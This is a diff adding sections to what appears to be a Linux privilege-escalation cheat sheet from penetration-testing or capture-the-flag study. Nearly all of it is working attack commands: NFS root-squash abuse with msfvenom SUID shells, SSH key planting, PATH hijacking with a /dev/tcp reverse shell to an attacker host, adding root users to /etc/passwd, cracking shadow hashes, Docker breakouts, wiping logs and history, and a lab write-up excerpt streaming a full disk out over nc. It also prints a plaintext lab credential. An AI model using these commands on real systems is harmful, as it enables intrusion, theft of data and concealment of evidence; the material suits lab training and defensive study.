@@ -1096,17 +1096,462 @@ awk 'BEGIN {system("/bin/bash")}' awk
 perl -e 'exec "/bin/bash";' Perl 
 ```
 
-## 
+## Mounted Shares
+```
+File Mount 
+/mnt/media -> usb devices and other mounted disks
+mount -> show all the mounted drives
+df -h -> list all partitions
+cat /etc/fstab # list all drives mounted at boot time
+/bin/lsblk
 
+Check Mounted Shares
+cat /etc/fstab  ←  Checking mounted shares
+UUID=ede2f74e-f23a-441c-b9cb-156494837ef3       /       ext4    rw,relatime 0 1
+UUID=8e53ca17-9437-4f54-953c-0093ce5066f2       /boot   ext4    rw,relatime 0 2
+UUID=ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046       swap    swap    defaults        0 0
+/dev/cdrom      /media/cdrom    iso9660 noauto,ro 0 0
+/dev/usbdisk    /media/usb      vfat    noauto  0 0
+//10.5.5.20/Scripts    /mnt/scripts  cifs  uid=0,gid=0,username=,password=,_netdev 0 0
 
+The contents of /etc/fstab are interesting. A share is mounted from the 10.5.5.20 host. 
+Let's poke around the //10.5.5.20/Scripts share and see what we find.
 
+cd /mnt/scripts
+ls
+nas_setup.yml
+olduserlookup.ps1
+system_report.ps1
+temp_folder_cleanup.bat
 
+cat system_report.ps1
+# find a better way to automate this
+$username = "sandbox\alex"
+$pwdTxt = "Ndawc*nRoqkC+haZ"  ← Found credentials in a mounted share from the 10.5.5.20 host. 
 
+/dev/sda1 readable?
+debugfs /dev/sda1 # Get root's SSH private key
 
+Unmounted Systems?
+On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. 
+We should always look for unmounted drives, and if they exist, check the mount permissions.On Linux-based systems, we can use mount to list all mounted filesystems. 
+In addition, the /etc/fstab22 file lists all drives that will be mounted at boot time.
+cat /etc/fstab
+mount
+lsblk
+```
 
+## NFS ( Mount Directory )
+```
+NFS Shares Anonymous Mountable
+showmount -e <target IP>
 
+Mount misconfigured directory
+$ showmount -e 192.168.xx.53 ← Inspect the export list for share names
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount  ←  Make the directory for mounting
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock ← Mount the share
+```
 
+## NFS 1 ( Root Sqashing Disabled )
+```
+Root Squashing Enabled?
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+Check the NFS share configuration on the Debian VM:
+cat /etc/exports
+Note that the /tmp share has root squashing disabled.
 
+On your Kali box, switch to your root user if you are not already running as root:
+sudo su
+
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
+mkdir /tmp/nfs  ← Create a mount point on your kali box
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs  ← Mount the /tmp share
+
+Save msfvenom CMD='/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+Still using Kali's root user, make the file executable and set the SUID permission:
+chmod +xs /tmp/nfs/shell.elf  ← Make it executable and set the SUID permission
+
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+/tmp/shell.elf
+```
+
+## NFS 2 (Manually Diasable: apply "no_root_squash")
+```
+NFS (edit /etc/exports if possible and apply "no_root_squash")
+    - in lse.out seasrch for "NFS"
+        - verify
+            > showmount -e 192.168.1.159
+            > cat /etc/exports
+    - rootsquash
+        - disable root squash
+            - edit /etc/exports if possible and apply "no_root_squash"
+                > echo "/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)" > /etc/exports
+        - create msfvenom 
+            > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
+        - mount share and create a rootbash file with +xs (must create IN directory)
+            > mkdir mnt/
+            > sudo mount -o rw,vers=2 192.168.1.159:/tmp mnt/
+            > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf shell.elf
+            > chmod +xs /tmp/nfs/shell.elf
+        - Back in your regular user
+            > /tmp/shell.elf -p
+```
+
+## NFS 3 ( id_rsa.pub upload )
+```
+.ssh/id_rsa.pub key upload to authorized_keys:
+mkdir /tmp/mount <- Make the mounting point/directory
+mount -t nfs -o nolock <target IP>:/share /tmp/mount/ <- Mount the share
+cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys  <- Append your id_rsa.pub key to /tmp/mount/root/.ssh/authorized_keys.
+umount /tmp/mount <- Unmount the mounted sharepoint
+ssh root@<target IP> <- SSH into the target machine as appended root user
+```
+
+## Weak File Permissions / Advanced File Permissions
+## SUID / GUID / Sticky Bits
+```
+Cross Reference your findings with GTFObins
+Some common binaries in gtfobins:
+gtfoBinsList=("aria2c" "arp" "ash" "awk" "base64" "bash" "busybox" "cat" "chmod" "chown" "cp" "csh" "curl" "cut" "dash" "date" "dd" "diff" "dmsetup" "docker" "ed" "emacs" "env" "expand" "expect" "file" "find" "flock" "fmt" "fold" "ftp" "gawk" "gdb" "gimp" "git" "grep" "head" "iftop" "ionice" "ip" "irb" "jjs" "jq" "jrunscript" "ksh" "ld.so" "ldconfig" "less" "logsave" "lua" "make" "man" "mawk" "more" "mv" "mysql" "nano" "nawk" "nc" "netcat" "nice" "nl" "nmap" "node" "od" "openssl" "perl" "pg" "php" "pic" "pico" "python" "readelf" "rlwrap" "rpm" "rpmquery" "rsync" "ruby" "run-parts" "rvim" "scp" "script" "sed" "setarch" "sftp" "sh" "shuf" "socat" "sort" "sqlite3" "ssh" "start-stop-daemon" "stdbuf" "strace" "systemctl" "tail" "tar" "taskset" "tclsh" "tee" "telnet" "tftp" "time" "timeout" "ul" "unexpand" "uniq" "unshare" "vi" "vim" "watch" "wget" "wish" "xargs" "xxd" "zip" "zsh")
+
+List all suid and guid binaries:
+> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
+
+SGID or SUID:
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+
+# Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search):
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied):
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+Setting the SUID bit:
+chmod 6555 binary
+```
+
+## SUID BinPath Hijacking
+```
+Path Hijacking
+Add a value of a directory to path, put it in the front so this will be used first, before the real path of the service. 
+Then you can make a malicious service with the same name in the added path, and that will run instead.
+
+$ path =/tmp:$PATH
+$ echo $PATH
+
+Path Hijacking 1
+Some examples to execute SUID files and replace in $PATH
+
+Find some SUID files
+$ find \ -perm -4000 2>/dev/null # 2>/dev/null exclude the stderr in output
+/bin/<file_name_with_suid>
+$ touch <same_file_name_with_suid> # Create a new file
+$ chmod 777 <same_file_name_with_suid>
+
+chmod 4755
+To give SUID privileges to any file, binary, in this case /bin/bash 
+$ echo "#/bin/bash" > <same_file_name_with_suid>
+$ echo "chmod 4755" >> <same_file_name_with_suid>
+
+$ nano <same_file_name_with_suid>
+    #/bin/bash
+    chmod 4755 /bin/bash
+    
+$ vim <same_file_name_with_suid>
+    #/bin/bash
+    chmod 4755 /bin/bash    
+
+Add the new path in the actual path
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
+$ export PATH=/home/example/<same_file_name_with_suid>:$PATH # $PATH contains the actual PATH   
+$ echo $PATH
+/home/example/<same_file_name_with_suid>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
+$ echo "****** Execute again the SUID file  *******"
+
+Now just in the terminal type: 
+$ bash -p # To execute bash with the actual privileges
+
+Reverse Shell
+In the attack machine we are going to listen to any port
+$ nc -lnvp 443
+
+Now create a file with a connection to the attacker lhost and port 443
+$ echo "/bin/bash -c 'bash -i >& /dev/tcp/<attackerlhost>/443 0>&1'" > <same_file_name_with_suid>    
+
+Add the new path in the actual path 
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
+$ export PATH=/home/example/<same_file_name_with_suid>:$PATH # $PATH contain the actual PATH   
+$ echo $PATH
+/home/example/<same_file_name_with_suid>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
+$ echo "****** Execute again the SUID file  *******"
+```
+
+## /etc/shadow Readable
+```
+Readable /etc/shadow
+The /etc/shadow file contains user password hashes and is usually readable only by the root user. Note that the /etc/shadow file on the VM is world-readable:
+ls -l /etc/shadow
+
+View the contents of the /etc/shadow file:
+cat /etc/shadow
+
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. 
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Switch to the root user, using the cracked password:
+su root
+
+Apache2
+Abuse intended functionality with apache2 
+        - apache2
+            > sudo apache2 -f /etc/shadow
+                - Crack the hash output
+```
+
+## /etc/shadow Writeable
+```
+Writeable /etc/shadow
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.Note that the /etc/shadow file on the VM is world-writable:
+ls -l /etc/shadow
+
+Generate a new password hash with a password of your choice:
+mkpasswd -m sha-512 newpasswordhere
+
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+Switch to the root user, using the new password:
+su root
+```
+
+## /etc/passwd Writeable
+```
+Writable /etc/passwd
+muted@debian:~$openssl passwd evil ← Generate Password
+AK24fcSx2Il3I
+muted@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd  ← Append to /etc/passwd
+muted@debian:~$ su root2 ← Switch to new root user
+Password: evil
+root@debian:/home/student# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Replace root password hash
+    Kali: generate a password openssl passwd hacker123 and obtain a password hash.
+    Target: replace root password x in /etc/passwd file with password hash i.e. root:<has>:0:0:----
+    
+# Writable /etc/passwd?
+Remove 'x' beside a username --> no password
+# Create a new user
+openssl passwd "lol" # Prints out a hash
+# Make a new entry at the end of /etc/passwd
+root:$passwd_hash:0:0:/root:/bin/bash # Become r00t yourself    
+
+Once we have the generated hash, we will add a line to /etc/passwd using the appropriate format:
+muted@debian:~$ openssl passwd w00t
+Fdzt.eqJQ4s0g
+muted@debian:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+muted@debian:~$ su root2
+Password: w00t
+root@debian-privesc:/home/root# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## World Writeables ( /tmp, /var/tmp, /dev/shm )
+```
+World Writeables
+Find readable and writable directories for user or group:
+        - find / -user <user> 2>/dev/null
+        - find / -group <group> 2>/dev/null
+    - Writeable locations
+        > find / -type d -writable 2>/dev/null
+        > find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
+    - Writeable files
+        > find -type f -writable -ls ← Search for writeable files
+        - In current directory
+            > find . -writable
+        - Maybe theres some python binaries you can write to?
+
+Where can be written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+Any "problem" files? Word-writeable, "nobody" files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+```
+
+## Preparation and Finding Exploit Code
+```
+Preparation & Finding Exploit Code
+What development tools/languages are installed/supported?
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+
+How can files be uploaded?
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+
+## Finding exploit code
+http://www.exploit-db.com
+http://1337day.com
+http://www.securiteam.com
+http://www.securityfocus.com
+http://www.exploitsearch.net
+http://metasploit.com/modules/
+http://securityreason.com
+http://seclists.org/fulldisclosure/
+http://www.google.com 
+
+## Finding more information regarding the exploit 
+http://www.cvedetails.com
+http://packetstormsecurity.org/files/cve/[CVE]
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
+http://www.vulnview.com/cve-details.php?cvename=[CVE]
+
+Compilation
+#compile C with gcc
+gcc ./test.c -o ceva
+http://www.wikihow.com/Compile-a-C-Program-Using-the-GNU-Compiler-(GCC)
+```
+
+## Cleanup
+```
+Cleanup
+# Clear history, iptables and logs:
+iptables -F; history -c; find ./ -name “*.log” |xargs rm -f
+```
+
+## Docker Privesc
+```
+Docker
+Docker privesc
+Basic privesc example: https://flast101.github.io/docker-privesc/ More on Docker breakout & privesc: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+Writable Docker Socket /var/run/docker.sock: see here
+
+    Detected Linpeas.sh or manually.
+    Requires image -> if none, run docker pull to download an image to machine.
+
+# CHECK IF WRITABLE
+$ ls -la /var/run/docker.sock
+
+# OPTION 1
+$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+
+# OPTION 2
+$ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
+User in Docker group?
+user in docker group? Launch a container and be root over it in mnt. 
+Mounted root on the host to this machine docker container, in the container we have privs. 
+docker run -v /:/mnt -it alpine 
+
+The command id shows we are a member of the docker group. GTFObins again shows a method for spawning a root shell when we are a member of the docker group.
+
+First check what images we have available to us:
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+
+We can use the GTFObins command replacing the value <alpine> with one of the images listed above.
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+
+.dockerenv
+Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of 0873e8062560 means we are likely running inside a docker container.
+Using the command fdisk -l we can list the hosts disks.
+We can then create a directory and attempt to mount /dev/sda1 to it so we can see if we can browse the hosts file system.
+
+mkdir /mnt/own
+mount /dev/sda1 /mnt/own
+cd /mnt/own
+```
+
+## Disk Group
+```
+User in Disk Group?
+The first thing I check when I get a shell is the groups the user is in with the id command:
+
+atanas@kotarak-dmz:/$ id
+uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
+
+I also knew at this point that there was another container involved this box, and that I likely needed to get into it. I don’t see the lxc group here (or docker if this was running in Docker containers), which doesn’t let me interact with the container directly. But atanas is in the disk group, which gives access to the raw devices.
+
+lsblk shows how the devices are configured:
+
+atanas@kotarak-dmz:~$ lsblk
+NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda                      8:0    0   12G  0 disk 
+├─sda1                   8:1    0  120M  0 part /boot
+├─sda2                   8:2    0    1K  0 part 
+└─sda5                   8:5    0 11.9G  0 part 
+  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
+  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
+sr0                     11:0    1 1024M  0 rom 
+
+Kotarak--vg-root and Kotarak--vg-swap_1 are the root file system and swap space under LVM. Both live on the sda5 partition on sda. The LVM mappings live in /dev/mapper:
+
+atanas@kotarak-dmz:~$ ls -l /dev/mapper/
+total 0
+crw------- 1 root root 10, 236 May 14 20:51 control
+lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-root -> ../dm-0
+lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-swap_1 -> ../dm-1
+
+dm-0 is the device I want to read off to get the root of the filesystem.
+
+Exfil Filesystem
+I’ll use dd to read from the device, and nc to copy the entire filesystem off the device back to my host. I’ll send it through gzip to compress it so that it will move faster, but it still takes over seven minutes:
+
+atanas@kotarak-dmz:~$ time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.15 443
+14680064+0 records in
+14680064+0 records out
+7516192768 bytes (7.5 GB, 7.0 GiB) copied, 438.725 s, 17.1 MB/s
+
+Back on my host:
+mute@parrot$ nc -lnvp 443 > dm-0.gz
+listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 34610
+When it’s done, the compressed file is a bit over two gigs:
+
+mute@parrot$ ls -lh dm-0.gz
+-rwxrwx--- 1 root vboxsf 2.2G May 15 15:21 dm-0.gz
+
+It decompresses to seven gigs:
+mute@parrot$ gunzip dm-0.gz 
+mute@parrot$ ls -lh dm-0 
+-rwxrwx--- 1 root vboxsf 7.0G May 15 15:40 dm-0
+
+I can mount it, and access the file system:
+mute@parrot$ sudo mount dm-0-orig /mnt/
+mute@parrot$ ls /mnt/
+backups  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+
+/root is the host system, with flag.txt, not the container with root.txt:
+
+mute@parrot$ ls /mnt/root/
+app.log  flag.txt
+
+The containers keep their file system mounted in /var/lib/lxc/:
+
+mute@parrot$ sudo cat /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt
+950d1425************************
+
+I can verify that as atanas I can’t just access that directory directly:
+
+atanas@kotarak-dmz:~$ ls -ld /var/lib/lxc
+drwx------ 3 root root 4096 Jul 21  2017 /var/lib/lxc
+```
 
 
 
